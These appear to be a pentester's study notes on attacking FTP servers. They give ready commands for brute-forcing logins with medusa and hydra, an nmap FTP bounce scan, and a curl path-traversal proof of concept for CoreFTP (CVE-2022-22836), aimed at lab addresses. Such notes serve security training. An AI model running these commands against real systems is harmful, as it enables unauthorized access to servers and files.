### Misconfigurations 

#Anonymous Auth?

### Brute Forcing 
```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

```shell
hydra -L user.list -P pass.list <ip> ftp
```

### FTP Bounce Attack 
![[Pasted image 20230803132857.png]]
Use #FTP server to deliver outbound traffic to another device on the network. 

```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

Often disabled by default but can be #misconfigured  

### FTP Vulnerabilities 
#### CoreFTP before build 727 
[CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)

```shell
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
